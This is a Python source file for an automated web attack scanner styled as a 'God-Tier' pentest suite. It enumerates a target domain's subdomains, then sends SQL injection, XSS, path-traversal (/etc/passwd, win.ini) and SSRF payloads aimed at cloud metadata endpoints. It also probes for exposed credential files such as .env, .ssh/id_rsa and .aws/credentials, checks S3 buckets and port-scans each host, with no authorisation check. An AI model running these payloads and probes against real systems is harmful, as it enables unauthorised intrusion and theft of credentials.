
import asyncio
import aiohttp
import aioconsole
import json
import time
import ssl
import socket
import argparse
import random
import re
import sys
import dns.resolver
from datetime import datetime
from typing import List, Dict, Set, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, quote_plus
from bs4 import BeautifulSoup

# God-Tier TUI Imports
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.logging import RichHandler
from rich.syntax import Syntax
from rich.columns import Columns
from rich.align import Align

# Intelligence API Clients (Optional, but integrated)
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

# Suppress Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
try:
    import requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

# God-Tier Banner
BANNER = """
[bold red] ██████╗  ██████╗ ██████╗     ████████╗██╗███████╗██████╗ [/bold red]
[bold red]██╔════╝ ██╔═══██╗██╔══██╗    ╚══██╔══╝██║██╔════╝██╔══██╗[/bold red]
[bold red]██║  ███╗██║   ██║██║  ██║       ██║   ██║█████╗  ██████╔╝[/bold red]
[bold red]██║   ██║██║   ██║██║  ██║       ██║   ██║██╔══╝  ██╔══██╗[/bold red]
[bold red]╚██████╔╝╚██████╔╝██████╔╝       ██║   ██║███████╗██║  ██║[/bold red]
[bold red] ╚═════╝  ╚═════╝ ╚═════╝        ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝[/bold red]
[bold white]Advanced Pentesting Suite - GOD-TIER EDITION | v3.0[/bold white]
"""

@dataclass
class GodTierResult:
    target: str
    ips: List[str] = field(default_factory=list)
    ports: List[int] = field(default_factory=list)
    banners: Dict[int, str] = field(default_factory=dict)
    http_status: Optional[int] = None
    http_title: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    vulns: List[Dict[str, str]] = field(default_factory=list)
    endpoints: List[str] = field(default_factory=list)
    sensitive_files: List[str] = field(default_factory=list)
    cname: Optional[str] = None
    ssl_info: Dict[str, Any] = field(default_factory=dict)
    s3_buckets: List[str] = field(default_factory=list)

class APSGodTierEngine:
    def __init__(self, domain: str, threads: int = 100, aggressive: bool = True, 
                 shodan_key: str = None, ai_mode: bool = True):
        self.domain = domain
        self.threads = threads
        self.aggressive = aggressive
        self.shodan_key = shodan_key
        self.ai_mode = ai_mode
        
        self.console = Console()
        self.results: Dict[str, GodTierResult] = {}
        self.found_subs: Set[str] = {domain}
        self.lock = asyncio.Lock()
        self.session: Optional[aiohttp.ClientSession] = None
        self.start_time = time.time()
        self.log_file = f"aps_god_tier_{int(time.time())}.log"
        
        # God-Tier Payloads
        self.sqli_payloads = ["'", "''", "';--", "' OR 1=1--", "' UNION SELECT NULL,NULL,NULL--", "sleep(5)#", "pg_sleep(5)--", "WAITFOR DELAY '0:0:5'--"]
        self.xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg onload=alert(1)>", "'\"><script>alert(1)</script>"]
        self.lfi_payloads = ["/etc/passwd", "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php"]
        self.ssrf_payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:22", "http://metadata.google.internal/computeMetadata/v1/"]
        
        self.subs_wordlist = ['www', 'mail', 'api', 'dev', 'stage', 'test', 'vpn', 'corp', 'internal', 'admin', 'portal', 'git', 'jenkins', 'docker', 'db', 'sql', 'app', 'cdn', 'static', 'secure', 'remote', 'gw', 'proxy', 'backup', 'old', 'new', 'm', 'mobile', 'api-docs', 'api-test', 'beta', 'demo', 'uat', 'qa', 'prod', 'staging', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 'ns2', 'whm', 'cpanel', 'autodiscover', 'autoconfig', 'crm', 'cms', 'svn', 'magento', 'ajax', 'php', 't', 'events', 's', 'owa', 'bbs', 'phone', 'net', 'my', 'dns2', 'exchange', 'apps', 'download', 'forum', 'id', 'adc', 'lc', 'en', 'git', 'v2', 'direct', 'fb', 'ads', 'click', 'link', 'host', 'int', 'it', 'edu', 'go', 'g', 'video', 'cc', 'blog', 'jpg', 'ns4', 'status', 'survey', 'w', 'ww', 'top', 'win', 'zip', 'pub', 'ins', 'rich', 'site', 'feed', 'mall', 'store', 'tech', 'fun', 'cab', 'aid', 'online', 'pro']
        self.sensitive_paths = ['.git/config', '.env', 'config.php', 'wp-config.php', 'phpinfo.php', '.htaccess', '.ssh/id_rsa', '.aws/credentials', 'backup.sql', 'dump.tar.gz', 'admin/', 'dashboard/', 'v1/api/', 'v2/api/', 'graphql/', 'actuator/health']

    def log(self, msg: str, level: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {"info": "white", "found": "bold green", "vuln": "bold red", "debug": "dim white"}[level]
        self.console.print(f"[[bold blue]{timestamp}[/bold blue]] {msg}", style=color)
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] [{level.upper()}] {msg}\n")

    async def init_session(self):
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(ssl=False, limit=self.threads)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout, headers={
            'User-Agent': 'Mozilla/5.0 (God-Tier APS Pentest Engine; v3.0)'
        })

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def fetch_passive_dns(self):
        self.log(f"Initiating God-Tier Passive Recon for {self.domain}...", "info")
        sources = [
            f"https://crt.sh/?q={self.domain}&output=json",
            f"https://www.threatcrowd.org/api/v2/domain/report?domain={self.domain}",
            f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
        ]
        
        async def fetch_source(url):
            try:
                async with self.session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        if "json" in url:
                            data = await resp.json()
                            if isinstance(data, list):
                                for entry in data:
                                    name = entry.get('name_value', '')
                                    for sub in name.split('\n'):
                                        if sub.endswith(self.domain):
                                            self.found_subs.add(sub.replace('*.', ''))
                            elif isinstance(data, dict):
                                for sub in data.get('subdomains', []):
                                    if sub.endswith(self.domain):
                                        self.found_subs.add(sub)
                        else:
                            text = await resp.text()
                            for line in text.splitlines():
                                sub = line.split(',')[0]
                                if sub.endswith(self.domain):
                                    self.found_subs.add(sub)
            except: pass

        await asyncio.gather(*(fetch_source(url) for url in sources))
        self.log(f"Passive Recon complete. Found {len(self.found_subs)} candidates.", "found")

    async def scan_vulns(self, url: str, res: GodTierResult):
        """God-Tier Vulnerability Scanning Engine"""
        # SQLi Check
        for p in self.sqli_payloads:
            try:
                test_url = f"{url}/?id={quote_plus(p)}"
                start = time.time()
                async with self.session.get(test_url, timeout=10) as resp:
                    text = await resp.text()
                    elapsed = time.time() - start
                    if any(err in text.lower() for err in ["sql syntax", "mysql_fetch", "ora-00933", "postgresql query error"]):
                        res.vulns.append({"type": "SQLi", "severity": "CRITICAL", "desc": f"Error-based SQLi with payload: {p}"})
                    if "sleep" in p and elapsed >= 5:
                        res.vulns.append({"type": "SQLi", "severity": "CRITICAL", "desc": f"Time-based SQLi with payload: {p}"})
            except: pass

        # XSS Check
        for p in self.xss_payloads:
            try:
                test_url = f"{url}/?q={quote_plus(p)}"
                async with self.session.get(test_url, timeout=5) as resp:
                    if p in await resp.text():
                        res.vulns.append({"type": "XSS", "severity": "HIGH", "desc": f"Reflected XSS with payload: {p}"})
            except: pass

        # LFI Check
        for p in self.lfi_payloads:
            try:
                test_url = f"{url}/?file={quote_plus(p)}"
                async with self.session.get(test_url, timeout=5) as resp:
                    text = await resp.text()
                    if "root:" in text or "[fonts]" in text:
                        res.vulns.append({"type": "LFI", "severity": "HIGH", "desc": f"LFI/Path Traversal with payload: {p}"})
            except: pass

        # SSRF Check
        for p in self.ssrf_payloads:
            try:
                test_url = f"{url}/?url={quote_plus(p)}"
                async with self.session.get(test_url, timeout=5) as resp:
                    if resp.status == 200 and any(m in await resp.text() for m in ["ami-id", "SSH-2.0", "instance-id"]):
                        res.vulns.append({"type": "SSRF", "severity": "CRITICAL", "desc": f"SSRF with payload: {p}"})
            except: pass

    async def check_s3_buckets(self, sub: str, res: GodTierResult):
        """God-Tier S3 Bucket Discovery"""
        bucket_names = [sub, sub.replace('.', '-'), sub.replace('.', ''), f"{sub}-backup", f"{sub}-dev"]
        for b in bucket_names:
            url = f"http://{b}.s3.amazonaws.com"
            try:
                async with self.session.get(url, timeout=5) as resp:
                    if resp.status != 404:
                        res.s3_buckets.append(url)
                        if "ListBucketResult" in await resp.text():
                            res.vulns.append({"type": "Cloud", "severity": "MEDIUM", "desc": f"Open S3 Bucket: {url}"})
            except: pass

    async def resolve_sub(self, sub: str):
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 2
            resolver.lifetime = 2
            
            ips = []
            try:
                answers = resolver.resolve(sub, 'A')
                ips = [str(rdata) for rdata in answers]
            except: pass
            
            if not ips: return

            res = GodTierResult(target=sub, ips=ips)
            
            # CNAME Check
            try:
                cname_answer = resolver.resolve(sub, 'CNAME')
                res.cname = str(cname_answer[0].target).rstrip('.')
                if any(p in res.cname for p in ['.herokudns.com', 's3.amazonaws.com', 'ghs.google.com', 'azurewebsites.net']):
                    res.vulns.append({"type": "Takeover", "severity": "HIGH", "desc": f"Potential Subdomain Takeover: {res.cname}"})
            except: pass

            # HTTP & Vuln Scan
            for proto in ['https', 'http']:
                try:
                    url = f"{proto}://{sub}"
                    async with self.session.get(url, allow_redirects=True, timeout=5) as resp:
                        res.http_status = resp.status
                        res.headers = dict(resp.headers)
                        soup = BeautifulSoup(await resp.text(), 'html.parser')
                        res.http_title = soup.title.string.strip() if soup.title else "No Title"
                        
                        # Massive Vuln Scan
                        await self.scan_vulns(url, res)
                        
                        # JS Analysis
                        scripts = soup.find_all('script', src=True)
                        for s in scripts:
                            js_url = urljoin(url, s['src'])
                            if self.domain in js_url:
                                async with self.session.get(js_url, timeout=5) as js_resp:
                                    js_content = await js_resp.text()
                                    endpoints = re.findall(r'/(?:api|v1|v2|graphql)/[a-zA-Z0-9_/-]+', js_content)
                                    res.endpoints.extend(list(set(endpoints)))
                                    if re.search(r'(?:api_key|secret|token|password)["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{16,})["\']', js_content, re.I):
                                        res.vulns.append({"type": "Info", "severity": "MEDIUM", "desc": f"Hardcoded Secret in {js_url}"})
                        break
                except: continue

            # Sensitive Paths & S3
            if res.http_status:
                for path in self.sensitive_paths:
                    try:
                        check_url = f"{'https' if res.http_status else 'http'}://{sub}/{path}"
                        async with self.session.head(check_url, timeout=3) as head_resp:
                            if head_resp.status == 200:
                                res.sensitive_files.append(check_url)
                                res.vulns.append({"type": "Info", "severity": "MEDIUM", "desc": f"Exposed Sensitive File: {path}"})
                    except: pass
                await self.check_s3_buckets(sub, res)

            # Port Scan
            common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017]
            for port in common_ports:
                try:
                    conn = asyncio.open_connection(ips[0], port)
                    _, writer = await asyncio.wait_for(conn, timeout=0.5)
                    res.ports.append(port)
                    writer.close()
                    await writer.wait_closed()
                except: pass

            async with self.lock:
                self.results[sub] = res
                self.log(f"GOD-TIER FIND: {sub} | Vulns: {len(res.vulns)} | Status: {res.http_status or 'N/A'}", "found")

        except Exception as e:
            if self.aggressive: self.log(f"Error scanning {sub}: {str(e)}", "debug")

    async def run_god_tier_scan(self):
        await self.init_session()
        await self.fetch_passive_dns()
        
        if self.aggressive:
            self.log("Aggressive Mode: Brute-forcing subdomains...", "info")
            for word in self.subs_wordlist:
                self.found_subs.add(f"{word}.{self.domain}")

        self.log(f"Starting God-Tier Deep Analysis of {len(self.found_subs)} targets...", "info")
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TaskProgressColumn(), console=self.console) as progress:
            task = progress.add_task("[red]Unleashing God-Tier Payloads...", total=len(self.found_subs))
            semaphore = asyncio.Semaphore(self.threads)
            async def sem_resolve(sub):
                async with semaphore:
                    await self.resolve_sub(sub)
                    progress.advance(task)
            await asyncio.gather(*(sem_resolve(sub) for sub in self.found_subs))

        await self.close_session()
        self.display_final_results()

    def display_final_results(self):
        self.console.print(Panel(Align.center(BANNER), border_style="bold red"))
        
        table = Table(title=f"God-Tier Report: {self.domain}", show_header=True, header_style="bold magenta", border_style="blue")
        table.add_column("Target", style="cyan", no_wrap=True)
        table.add_column("Status", style="bold yellow")
        table.add_column("Vulnerabilities", style="bold red")
        table.add_column("Cloud/S3", style="green")

        for sub, res in self.results.items():
            vulns_text = "\n".join([f"[{v['severity']}] {v['type']}" for v in res.vulns]) if res.vulns else "None"
            s3_text = "\n".join(res.s3_buckets) if res.s3_buckets else "None"
            table.add_row(sub, str(res.http_status or "N/A"), vulns_text, s3_text)

        self.console.print(table)
        
        total_vulns = sum(len(res.vulns) for res in self.results.values())
        crit_vulns = sum(1 for res in self.results.values() for v in res.vulns if v['severity'] == "CRITICAL")
        
        stats_panel = Panel(
            f"Active Hosts: [bold green]{len(self.results)}[/bold green]\n"
            f"Total Vulnerabilities: [bold red]{total_vulns}[/bold red]\n"
            f"CRITICAL EXPLOITS: [bold white on red] {crit_vulns} [/bold white on red]\n"
            f"Scan Time: [bold white]{round(time.time() - self.start_time, 2)}s[/bold white]",
            title="God-Tier Summary", border_style="bold red"
        )
        self.console.print(stats_panel)

async def main():
    parser = argparse.ArgumentParser(description="APS - God-Tier Edition")
    parser.add_argument("-d", "--domain", required=True, help="Target domain")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Concurrency")
    parser.add_argument("-a", "--aggressive", action="store_true", help="Aggressive Mode")
    args = parser.parse_args()
    
    engine = APSGodTierEngine(domain=args.domain, threads=args.threads, aggressive=args.aggressive)
    await engine.run_god_tier_scan()

if __name__ == "__main__":
    asyncio.run(main())
